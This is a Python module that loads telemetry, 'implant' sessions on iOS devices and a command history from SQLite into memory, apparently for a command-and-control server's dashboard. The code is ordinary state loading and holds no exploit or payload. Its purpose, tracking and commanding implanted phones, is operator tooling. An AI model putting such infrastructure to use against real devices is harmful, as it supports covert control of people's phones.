"""
Hydrate in-memory app_state from SQLite on startup.
"""

from __future__ import annotations

import json
import time

from .database import get_commands_recent, get_sessions_all, get_telemetry, get_telemetry_count
from .console_crud import load_global_control
from .state import C2Command, ImplantSession, TelemetryEvent, app_state


def load_runtime_state() -> None:
    """Restore telemetry buffer, C2 sessions, and command history from DB."""
    rows = get_telemetry(limit=500)
    if rows:
        events: list[TelemetryEvent] = []
        for row in reversed(rows):
            raw_body = row.get("raw_body", "{}")
            if isinstance(raw_body, str):
                try:
                    raw_body = json.loads(raw_body)
                except json.JSONDecodeError:
                    raw_body = {}
            events.append(
                TelemetryEvent(
                    id=row.get("event_id", ""),
                    timestamp=row.get("created_at", time.time()),
                    channel_code=row.get("channel_code", ""),
                    device_version=row.get("device_version", ""),
                    domain=row.get("domain", ""),
                    ip=row.get("ip", ""),
                    event_type=row.get("event_type", "BEACON_PING"),
                    raw_body=raw_body if isinstance(raw_body, dict) else {},
                )
            )
        app_state.telemetry_events.extend(events)

    app_state.telemetry_counter = max(get_telemetry_count(), len(app_state.telemetry_events))

    now = time.time()
    for row in get_sessions_all():
        session_id = row.get("session_id", "")
        if not session_id:
            continue
        last_hb = row.get("last_heartbeat", 0)
        is_alive = bool(row.get("is_alive", 0)) and (now - last_hb) < 120
        app_state.implant_sessions[session_id] = ImplantSession(
            session_id=session_id,
            device_id=row.get("device_id", ""),
            ip=row.get("ip", ""),
            ios_version=row.get("ios_version", ""),
            last_heartbeat=last_hb,
            is_alive=is_alive,
            implant_token=row.get("implant_token", ""),
        )

    for row in get_commands_recent(limit=500):
        args = row.get("args", "{}")
        response = row.get("response", "")
        if isinstance(args, str):
            try:
                args = json.loads(args)
            except json.JSONDecodeError:
                args = {}
        if isinstance(response, str):
            try:
                response = json.loads(response)
            except json.JSONDecodeError:
                response = response or {}
        app_state.command_history.append(
            C2Command(
                id=row.get("command_id", ""),
                timestamp=row.get("created_at", time.time()),
                cmd=row.get("cmd", ""),
                args=args if isinstance(args, dict) else {},
                status=row.get("status", "pending"),
                response=response if isinstance(response, dict) else {"raw": response},
            )
        )

    _refresh_layer_metrics()
    load_global_control()


def _refresh_layer_metrics() -> None:
    elapsed_h = max((time.time() - app_state.start_time) / 3600, 0.01)
    app_state.layers["L1"].metrics["events_per_hour"] = int(app_state.telemetry_counter / elapsed_h)
    app_state.layers["L1"].metrics["queue_depth"] = 0

    live = sum(1 for s in app_state.implant_sessions.values() if s.is_alive)
    app_state.layers["L3"].metrics["ipc_channels"] = len(app_state.implant_sessions)
    app_state.layers["L3"].metrics["c2_heartbeat"] = "OK" if live else "IDLE"
